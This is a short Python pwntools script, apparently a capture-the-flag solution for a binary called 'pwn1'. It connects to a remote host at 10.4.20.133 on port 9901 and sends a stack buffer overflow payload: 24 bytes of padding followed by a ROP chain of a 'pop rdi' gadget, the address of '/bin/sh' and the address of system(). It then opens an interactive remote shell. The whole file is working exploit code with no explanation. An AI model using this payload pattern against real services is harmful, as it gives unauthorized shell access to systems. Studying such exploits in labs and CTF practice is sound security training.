#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'
# p = process('pwn1')
p = remote('10.4.20.133',9901)
elf = ELF('pwn1')

system = 0x400590
binsh = 0x4007e4
poprdi = 0x04007c3

payload = "A" * 24 + p64(poprdi) + p64(binsh) + p64(system)

p.recvuntil('input : ')
p.sendline(payload)

p.interactive()

